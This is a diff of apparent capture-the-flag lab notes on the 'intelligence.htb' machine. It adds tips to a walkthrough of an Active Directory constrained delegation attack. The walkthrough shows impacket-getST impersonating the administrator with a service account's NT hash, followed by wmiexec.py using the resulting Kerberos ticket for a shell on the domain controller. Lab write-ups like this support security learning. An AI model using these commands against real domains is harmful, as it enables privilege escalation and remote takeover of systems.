@@ -416,7 +416,7 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
 AllowedToDelegate
 The constrained delegation primitive allows a principal to authenticate as any user to specific services
-
+use hash to impersonate, ':' matters at front of hash
 `└─$ impacket-getST -dc-ip 10.10.10.248 -impersonate administrator  intelligence.htb/svc_int$ -spn www/dc.intelligence.htb -hashes :b8159389d3528c4b1079ae461f28eb69`
 ```
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
@@ -428,7 +428,7 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 [*] Requesting S4U2Proxy
 [*] Saving ticket in administrator@www_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
 ```
-use ccache file to login
+use ccache file to login, remember to set dc.intelligence.htb to hosts
 `└─$ export KRB5CCNAME=administrator@www_dc.intelligence.htb@INTELLIGENCE.HTB.ccache; wmiexec.py -k -no-pass administrator@dc.intelligence.htb`
 ```
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
